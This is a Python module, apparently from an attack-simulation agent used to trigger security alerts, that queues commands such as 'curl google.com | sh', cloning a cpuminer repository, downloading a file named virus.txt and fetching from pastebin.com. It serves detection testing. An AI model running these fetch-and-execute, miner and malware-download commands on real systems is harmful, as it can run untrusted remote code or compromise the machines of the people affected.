#!/usr/bin/python3
import os

from AaSystem.EventQueue.CommandQueue import EnqueueCommandsNext
from AaSystem.LogAndPrint.Log import PrintAndLog, PrintRedAndLog
from Agent.BashCommands.BashCommandExecutor import RunSubProcess


def DownloadFileThenRun(request):
    if "-help" in request:
        Help_DownloadFileThenRun()
        return

    EnqueueCommandsNext(["custombash curl google.com | sh"])


def CryptoMiner(request):
    if "-help" in request:
        Help_CryptoMiner()
        return

    EnqueueCommandsNext(["gitclone https://github.com/cpuminer"])


def DownloadVirusFile(request):
    if "-help" in request:
        Help_DownloadVirusFile()
        return

    EnqueueCommandsNext(["createfiles -d ~/AriotsTemp/virus",
                         "downloadfile ~/AriotsTemp/virus/virus.txt "
                         "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt"])


def PossibleMalware(request):
    if "-help" in request:
        Help_PossibleMalware(request)
        return

    EnqueueCommandsNext(["retrievefile pastebin.com"])


def Help_DownloadFileThenRun():
    return PrintAndLog("\n"
                       "       Performs the bash command: 'curl google.com | sh'\n"
                       "       Triggers alert: 'DownloadFileThenRun'")


def Help_CryptoMiner():
    return PrintAndLog("\n"
                       "       Performs the bash command: 'git clone https://github.com/cpuminer'\n"
                       "       Triggers alert: 'CryptoMiner'")


def Help_DownloadVirusFile():
    return PrintAndLog("\n"
                       "       Performs the bash command: 'wget /home "
                       "https://raw.githubusercontent.com/YuvalFeldman/AttackAgentGetFile/master/virus.txt'\n"
                       "       Downloads a 'suspicious file from the internet")




def Help_PossibleMalware(request):
    return PrintAndLog("\n"
                       "       Performs the bash command: 'curl pastebin.com'\n"
                       "       Triggers alert: 'PossibleMalware'")


DownloadFileThenRun.PublicFacing = "downloadfilethenrun"
CryptoMiner.PublicFacing = "cryptominer"
DownloadVirusFile.PublicFacing = "downloadvirusfile"
PossibleMalware.PublicFacing = "possiblemalware"
